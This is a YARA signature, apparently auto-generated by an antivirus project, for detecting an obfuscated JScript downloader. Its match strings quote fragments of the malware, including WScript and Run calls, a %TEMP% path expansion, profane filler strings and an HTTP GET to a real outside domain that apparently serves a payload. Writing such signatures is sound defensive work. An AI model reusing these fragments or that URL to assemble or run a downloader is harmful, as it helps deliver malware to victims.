rule sig_20160428_e8c2009387fbab3e75684c2c2ae0b5cf {
  meta:
    description = "datamaliciousorder - file 20160428_e8c2009387fbab3e75684c2c2ae0b5cf.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ffb77ebb8b8fc479d79bdf3e56a3f2737e46837b5570979d5d98b13cc9c08522"

  strings:
    $s1  = "function IjdEouXjxMtkExoOtpQez() {return HktNdbVzcQqzLbnNyjSsw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function YykWqyDgoFrpHseGlrJdh(NqaPwmHylNlfGyiTsjYls){HktNdbVzcQqzLbnNyjSsw[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function YykWqyDgoFrpHseGlrJdh(NqaPwmHylNlfGyiTsjYls){HktNdbVzcQqzLbnNyjSsw[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function OkwHxvWjkYhbRshYdfDpz(IucDfcNepNiiJsqVegYtj, NbhLyrIdmRyhRbwMiiQvw){UikAniOehYghLfdDytKyn = UikAniOehYghLfdDytKyn * 1; " ascii
    $s5  = "return IucDfcNepNiiJsqVegYtj - NbhLyrIdmRyhRbwMiiQvw;};" fullword ascii
    $s6  = "var HktNdbVzcQqzLbnNyjSsw = function DkuGovRnrWgfRswJxuQni() {return YiaBxlQjvCjuQbjUlcDem[MbgOxvVjpVaiIyeKcqBaa](\"WScript\"+\"" ascii
    $s7  = "var YiaBxlQjvCjuQbjUlcDem = this[\"WScript\"];" fullword ascii
    $s8  = "var HktNdbVzcQqzLbnNyjSsw = function DkuGovRnrWgfRswJxuQni() {return YiaBxlQjvCjuQbjUlcDem[MbgOxvVjpVaiIyeKcqBaa](\"WScript\"+\"" ascii
    $s9  = "function IjdEouXjxMtkExoOtpQez() {return HktNdbVzcQqzLbnNyjSsw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "function OkwHxvWjkYhbRshYdfDpz(IucDfcNepNiiJsqVegYtj, NbhLyrIdmRyhRbwMiiQvw){UikAniOehYghLfdDytKyn = UikAniOehYghLfdDytKyn * 1; " ascii
    $s11 = "function DvjAccDttHbaGkaTzmPpx(){return 23;};" fullword ascii
    $s12 = "if (LxfXtcKkfXluXpoFylJue[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function GphPhjDsrGuhZseAoaIfe(){return RrkYknVdaLmuVafRjrHkl + \"\";};" fullword ascii
    $s14 = "function JkwNwfRrfMhjRayXxrOao() {return ((KqgEotUpzOqiRviYssPvk == true) && (KqgEotUpzOqiRviYssPvk == JcoSehNdhXsoOdaWebKwl)) ?" ascii
    $s15 = "function JkwNwfRrfMhjRayXxrOao() {return ((KqgEotUpzOqiRviYssPvk == true) && (KqgEotUpzOqiRviYssPvk == JcoSehNdhXsoOdaWebKwl)) ?" ascii
    $s16 = "LxfXtcKkfXluXpoFylJue[GtvUhyIuhMlpNlbRwxCaf](\"G\" + \"ET\", \"http://demo.sinelnikds.ru/b6sida\", false);" fullword ascii
    $s17 = "function DzkKujOotJnzThuRmqVpm(DgzEenDbnEncNklXgeNdh) {var IhlCpqFwkBfdRqgQamPak = (1, 2, 3, 4, 5, DgzEenDbnEncNklXgeNdh); retur" ascii
    $s18 = "function DzkKujOotJnzThuRmqVpm(DgzEenDbnEncNklXgeNdh) {var IhlCpqFwkBfdRqgQamPak = (1, 2, 3, 4, 5, DgzEenDbnEncNklXgeNdh); retur" ascii
    $s19 = "KqgEotUpzOqiRviYssPvk = true; " fullword ascii
    $s20 = "JcoSehNdhXsoOdaWebKwl = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}